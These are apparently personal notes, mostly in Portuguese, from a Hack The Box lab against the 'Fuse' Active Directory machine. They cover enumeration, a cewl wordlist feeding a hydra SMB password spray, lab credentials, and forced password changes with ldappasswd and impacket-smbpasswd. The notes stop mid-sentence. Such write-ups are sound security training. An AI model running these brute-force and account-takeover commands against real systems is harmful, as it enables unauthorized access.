Fuse
========================
# Enumeration

    sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269 -Pn -n --script vuln 10.10.10.193 | tee nmap_vulns.txt

![qownnotes-media-SmPvaC](../../../media/qownnotes-media-SmPvaC.png)

TCP Servicos
DNS - OK
Kerberos (AD) 88/646 - OK
RPC 135/593 - OK
SMB - OK
LDAP (AD) 389,636(ssl),3268,3269(ssl) - OK
HTTP - A unica coisa que restou aqui e eu nao levei em conta (somente quando olhei o write-up)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.193

UDP somente DNS

![qownnotes-media-VcQogl](../../../media/qownnotes-media-VcQogl.png)


    sudo nmap -p- -Pn -T5 -n 10.10.10.193
 
 ![qownnotes-media-rimMPG](../../../media/qownnotes-media-rimMPG.png)

    
    sudo nmap_enum 10.10.10.193 | tee nmap_output.txt

## Servicos

[DNS](Fuse.md#DNS) 
[HTTP](Fuse.md#HTTP) 
[Kerberos](Fuse.md#Kerberos) 
[SMB](Fuse.md#SMB) 
[RPC](Fuse.md#RPC) 
[LDAP](Fuse.md#LDAP)

    smbclient -L //10.10.10.193
 
 ![qownnotes-media-vPXIOn](../../../media/qownnotes-media-vPXIOn.png)

ANONYMOUS ACCESS

    enum4linux -a 10.10.10.193
    
![qownnotes-media-DdQzrh](../../../media/qownnotes-media-DdQzrh.png)

Nome do dominio

FABRICORP.LOCAL

    

![qownnotes-media-ffjIXn](../../../media/qownnotes-media-ffjIXn.png)

## DNS

    host -t axfr 10.10.10.193 10.10.10.193
    
![qownnotes-media-VNypIv](../../../media/qownnotes-media-VNypIv.png)


    dnsenum --dnsserver 10.10.10.193 fabricorp.local

![qownnotes-media-MGOBIs](../../../media/qownnotes-media-MGOBIs.png)


## HTTP

    gobuster dir -u http://10.10.10.193 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_gobuster.txt"

![qownnotes-media-xnxPNd](../../../media/qownnotes-media-xnxPNd.png)

![qownnotes-media-QCKAqa](../../../media/qownnotes-media-QCKAqa.png)

    searchsploit papercut

![qownnotes-media-aGWLkM](../../../media/qownnotes-media-aGWLkM.png)

Esses dois exploits encontrados nao sao pertinentes a essa aplicacao, mas sim da manager. Proximo servico.

    nikto -T x 6 http://10.10.10.193
    
    dirb http://fuse.htb

![qownnotes-media-iSiyrL](../../../media/qownnotes-media-iSiyrL.png)


## SMB

![qownnotes-media-PLpypK](../../../media/qownnotes-media-PLpypK.png)

![qownnotes-media-BVWcBB](../../../media/qownnotes-media-BVWcBB.png)

## Kerberos

    sudo nmap -Pn -sV -p 88 --script="banner,krb5-enum-users" -oN "tcp_port_kerberos_nmap.txt" 10.10.10.193
![qownnotes-media-BFzJrA](../../../media/qownnotes-media-BFzJrA.png)

    
    impacket-GetNPUsers -request -usersfile usernames.txt -dc-ip 10.10.10.193 fabricorp.local/
![qownnotes-media-unbDPe](../../../media/qownnotes-media-unbDPe.png)

    kerbrute userenum --dc 10.10.10.193 -d fabricorp.local usernames.txt

![qownnotes-media-nJlhnh](../../../media/qownnotes-media-nJlhnh.png)


## LDAP

    nmap -Pn -sV -p 389,636,3268,3269 --script="banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_port_ldap_nmap.txt" 10.10.10.193

    ldapsearch -H ldap:// 10.10.10.193 -x -s base namingcontexts
    
    ldapsearch -H ldap://10.10.10.193 -x -b "DC=fabricorp,DC=local"
    
![qownnotes-media-HxaxIr](../../../media/qownnotes-media-HxaxIr.png)


## RPC

    nmap -Pn -sV -p 135 --script=banner,msrpc-enum,rpc-grind,rpcinfo -oN tcp_port_rpc_nmap.txt 10.10.10.193

![qownnotes-media-DQxmyn](../../../media/qownnotes-media-DQxmyn.png)

    rpcclient -U '' -N 10.10.10.193
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall

![qownnotes-media-FoudSj](../../../media/qownnotes-media-FoudSj.png)

# Exploitation

Depois de fazer toda essa enumeracao, acabei nao achando o entry point, no entanto deixei de fazer a unica coisa que estava faltando de acordo com a metodologia OSCP. Fazer um dicionario de palavras com cewl na web:

    cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > wordlist.txt
    
    hydra -L usernames.txt -P wordlist.txt smb://10.10.10.193
    #ou
    hydra -L usernames.txt -P wordlist.txt 10.10.10.193 smb
    
![qownnotes-media-cbCxfu](../../../media/qownnotes-media-cbCxfu.png)

Teste@123

Algumas tentativas para trocar a senha do usuario:

    ldapsearch -x -H ldap://10.10.10.193 -D "tlavel@fabricorp.local" -W -b "dc=streamio,dc=htb" "(objectclass=group)"
![qownnotes-media-PtlfVz](../../../media/qownnotes-media-PtlfVz.png)

    ldappasswd -H ldap://10.10.10.193 -x -W -S "uid=tlavel,ou=people,dc=fabricorp,dc=local"
![qownnotes-media-nddyOR](../../../media/qownnotes-media-nddyOR.png)

    ldappasswd -H ldaps://10.10.10.193:636 -D "uid=tlavel,ou=serviceaccounts,dc=fabricorp,dc=local" -S -W -ZZ
    
    ldappasswd -H ldaps://10.10.10.193:3269 -D "uid=tlavel,ou=serviceaccounts,dc=fabricorp,dc=local" -S -W -ZZ
    
    ldappasswd -H ldap://10.10.10.193:3268 -D "uid=tlavel,ou=serviceaccounts,dc=fabricorp,dc=local" -S -W -ZZ
    
    ldappasswd -H ldap://10.10.10.193:636 -D "uid=tlavel,ou=serviceaccounts,dc=fabricorp,dc=local" -S -W -ZZ
    
    ldappasswd -H ldaps://10.10.10.193:636 -D "uid=tlavel,ou=serviceaccounts,dc=fabricorp,dc=local" -S -W -ZZ
    
    ldappasswd -H ldaps://10.10.10.193:636 -D "uid=tlavel,ou=serviceaccounts,dc=fabricorp,dc=local" -S -W -Z
    
![qownnotes-media-KnJhBU](../../../media/qownnotes-media-KnJhBU.png)
    
    ldappasswd -H ldap://10.10.10.193:636 -D "uid=tlavel,ou=serviceaccounts,dc=fabricorp,dc=local" -S -W -Z
![qownnotes-media-YaXgRG](../../../media/qownnotes-media-YaXgRG.png)

Com base em <https://www.digitalocean.com/community/tutorials/how-to-change-account-passwords-on-an-openldap-server>

    ldappasswd -H ldap://10.10.10.193 -x -D "tlavel" -W -A -S
    
Analisando outras ferramentas:

    impacket-smbpasswd -newpass 'R3dT3@m1020' fabricorp.local/tlavel:Fabricorp01@10.10.10.193
    
![qownnotes-media-smKuyZ](../../../media/qownnotes-media-smKuyZ.png)

Esse metodo ate funcionou, mas teporariamente e estou tentando entender o porque disso. 
Foi feito um one-liner para executar comandos e alterar a senha do usuario de tempos em tempos que dessa forma erea possivel fazer uma enumeracao para obter uma shell:




    